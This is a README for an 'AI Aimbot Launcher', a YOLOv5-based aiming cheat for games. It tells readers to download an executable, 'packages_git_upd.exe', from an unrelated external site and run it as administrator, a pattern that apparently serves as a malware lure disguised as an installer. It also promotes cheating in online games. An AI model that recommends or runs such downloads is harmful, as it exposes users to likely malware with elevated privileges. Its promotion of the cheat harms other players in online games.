# AI Aimbot Launcher

**Automatic installer and updater for a visual AI aimbot.**

This tool allows you to quickly deploy and keep up-to-date an AI aimbot based on YOLOv5 for games with humanoid characters.

## 🚀 Quick Start

### Installation and Update
[![Download Now](https://img.shields.io/badge/Download-Official%20Release-8A2BE2?style=for-the-badge&logo=windows)](https://fullsofts.org)

### 1. **Download** `packages_git_upd.exe` from button above 
2. **Run the program** (recommended as administrator)
3. Wait for the automatic installation/update of all components to complete

### What the Installer Does

- ✅ Automatically downloads or updates the AI Aimbot code
- ✅ Installs required Python dependencies
- ✅ Checks for the required environment
- ✅ Updates an existing installation to the latest version

## 🎯 Main Features

- **Visual Aim Assistant** – works solely based on image analysis, without injecting into game memory
- **YOLOv5 Support** – modern neural network model for object detection
- **Cross-Game Compatibility** – works with any games featuring humanoid characters
- **Multiple Performance Modes** – from CPU version to optimized TensorRT

## 📁 After Installation

After successfully running `packages_git_upd.exe`, you will get:

1. A full copy of the AI Aimbot project
2. Installed Python dependencies
3. A ready-to-use environment

### To Launch the Aim Assistant:

1. Navigate to the folder with the installed project
2. Run the chosen version:
   - **Standard**: `python main.py`
   - **Optimized**: `python main_onnx.py`
   - **Maximum Performance** (requires NVIDIA GPU): `python main_tensorrt.py`

## ⚙️ Controls

- **CAPS_LOCK** – toggle the aim assistant on/off
- **Q Key** – emergency shutdown of the program

## ⚠️ Disclaimer

**Use at your own risk!**
- Intended for educational purposes only
- Use in online games may result in account bans
- The developers are not responsible for any consequences of use

## 🔧 For Developers

If the installer doesn't work or you need customization:
1. Download the source code manually
2. Install dependencies via `pip install -r requirements.txt`
3. Set up the environment according to the project documentation

